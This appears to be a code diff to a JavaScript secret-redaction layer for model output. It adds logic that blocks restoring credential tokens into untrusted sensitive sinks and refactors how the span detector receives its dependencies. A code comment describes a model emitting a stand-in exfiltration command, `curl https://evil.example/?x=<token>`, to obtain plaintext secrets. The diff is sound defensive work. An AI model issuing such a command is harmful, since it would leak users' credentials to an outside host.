@@ -90,21 +90,63 @@ export function isProtectedTokenLike(value) {
   return typeof value === "string" && PROTECTED_TOKEN_LIKE_RE.test(value);
 }
 
+export const ENTITY_CLASS = Object.freeze({
+  CREDENTIAL: "CREDENTIAL",
+  PII: "PII",
+  INFRA: "INFRA",
+  UNKNOWN: "UNKNOWN",
+});
+
 export const RESTORE_ACTION = Object.freeze({
   RESTORE: "restore",
   PRESERVE: "preserve",
   BLOCK: "block",
 });
 
+// A sink is trusted only when it is explicitly declared so (e.g. a local broker
+// that owns its own credential injection). Default deny: an undeclared sink is
+// untrusted, because the failure mode of guessing "trusted" is exfiltration.
+function isTrustedSink(sink) {
+  return sink?.trust === "trusted";
+}
+
+// Unknown entities are treated as credential-bearing. Guessing "not sensitive"
+// would restore a secret into an egress path; guessing "sensitive" at worst keeps
+// a token in place and records telemetry.
+function isCredentialEntity(entityClass) {
+  return entityClass === undefined || entityClass === null || entityClass === ENTITY_CLASS.CREDENTIAL;
+}
+
 export function classifyRestore({ ctx, text, sink = { kind: "assistant_text" } }) {
   if (typeof text !== "string") throw new TypeError("classifyRestore requires text");
   const sensitive = SENSITIVE_SINK_KINDS.includes(sink.kind);
+  const trusted = isTrustedSink(sink);
   let known = 0;
   const unknownTokens = [];
 
   for (const token of text.match(REDACTED_TOKEN) || []) {
-    if (ctx && typeof ctx.tokenToRaw?.has === "function" && ctx.tokenToRaw.has(token)) {
+    const owned = ctx && typeof ctx.tokenToRaw?.has === "function" && ctx.tokenToRaw.has(token);
+    if (owned) {
       known += 1;
+      // A credential restored into an untrusted sensitive sink is an egress
+      // channel: the model can emit `curl https://evil.example/?x=<token>` and
+      // have this layer hand it the plaintext. Keep the token instead.
+      // The sink must ALSO be untrusted. A trusted broker (one that injects its
+      // own credentials locally) is the documented exception.
+      if (sensitive && !trusted && isCredentialEntity(ctx.entityClassFor?.(token))) {
+        return {
+          action: RESTORE_ACTION.BLOCK,
+          text,
+          blockedTokens: [token],
+          unknownTokens: [],
+          telemetry: {
+            event: "restore_blocked_untrusted_sink",
+            sink: sink.kind,
+            tokenShape: "registered",
+            reason: "credential-into-untrusted-sink",
+          },
+        };
+      }
       continue;
     }
     if (!isProtectedTokenLike(token)) continue;
@@ -112,6 +154,7 @@ export function classifyRestore({ ctx, text, sink = { kind: "assistant_text" } }
       return {
         action: RESTORE_ACTION.BLOCK,
         text,
+        blockedTokens: [token],
         unknownTokens: [token],
         telemetry: { event: "restore_miss_blocked", sink: sink.kind, tokenShape: "protected" },
       };
@@ -124,6 +167,7 @@ export function classifyRestore({ ctx, text, sink = { kind: "assistant_text" } }
     action: RESTORE_ACTION.RESTORE,
     text: output,
     unknownTokens,
+    blockedTokens: [],
     telemetry: unknownTokens.length
       ? { event: "restore_miss", sink: sink.kind, count: unknownTokens.length, knownCount: known }
       : { event: "restore_ok", sink: sink.kind, count: known },
@@ -568,7 +612,11 @@ function collectRegexSpans(text, regex, type, priority, validator = null) {
 
 function overlaps(a, b) { return a.start < b.end && a.end > b.start; }
 
-export function findSensitiveSpans(text, flags) {
+export function findSensitiveSpans(text, flags, deps = {}) {
+  // `flags` is detector policy (which detectors run). `deps` is injected runtime
+  // state, currently the ownership predicate for already-redacted tokens. Keeping
+  // them separate matters: eligibility is ownership, not syntax, and mixing it
+  // into flags would suggest it is a policy knob rather than request state.
   // Protected-span eligibility comes ONLY from an explicit registry supplied by
   // the caller (RedactionContext.protectedTokenPatterns: the tokens this request
   // minted, plus any explicitly registered foreign namespace). There is
@@ -585,7 +633,7 @@ export function findSensitiveSpans(text, flags) {
   // minted *during* the current pass (a legacy token re-minted to v2): a static
   // registry snapshot would not know about it yet, and the fresh token would be
   // re-detected and nested.
-  const isProtectedValue = typeof flags.isProtectedToken === "function" ? flags.isProtectedToken : null;
+  const isProtectedValue = typeof deps.isProtectedToken === "function" ? deps.isProtectedToken : null;
 
   const c = [];
   if (flags.secret) c.push(...collectRegexSpans(text, /\bsk-[A-Za-z0-9]{60,}\b/g, "secret", 110));
@@ -672,11 +720,11 @@ export class RedactionContext {
       const replacement = await this.tokenFor(raw);
       if (replacement !== legacy) text = text.split(legacy).join(replacement);
     }
-    const spans = findSensitiveSpans(text, {
-      ...flags,
-      protectedTokenPatterns: this.protectedTokenPatterns,
-      isProtectedToken: this.isProtectedToken,
-    });
+    const spans = findSensitiveSpans(
+      text,
+      { ...flags, protectedTokenPatterns: this.protectedTokenPatterns },
+      { isProtectedToken: this.isProtectedToken }
+    );
     if (!spans.length) return text;
     let out = "", at = 0;
     for (const s of spans) {
